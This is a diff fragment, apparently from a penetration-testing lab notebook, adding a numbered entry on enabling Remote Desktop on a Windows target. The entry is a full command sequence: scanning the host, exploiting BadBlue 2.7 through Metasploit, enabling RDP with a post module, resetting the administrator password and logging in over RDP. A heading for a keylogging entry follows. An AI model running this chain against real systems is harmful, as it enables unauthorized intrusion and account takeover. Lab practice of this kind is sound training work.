@@ -1379,8 +1379,28 @@ exploit ## for new terminal
 session -i 1
 reboot
 
+```
+72)   Windows: Enabling Remote Desktop
 
 ```
+cat /root/Desktop/target
+nmap 10.0.0.68
+nmap -sV -p 80 10.0.0.68
+searchsploit badblue 2.7
+msfconsole
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.0.68
+exploit
+use post/windows/manage/enable_rdp
+set SESSION 1
+exploit
+nmap 10.0.0.68
+sessions -i 1
+shell
+net user administrator hacker_123321
+xfreerdp /u:administrator /p:hacker_123321 /v:10.0.0.68
+```
+73) Windows: File and Keylogging
 
 
 
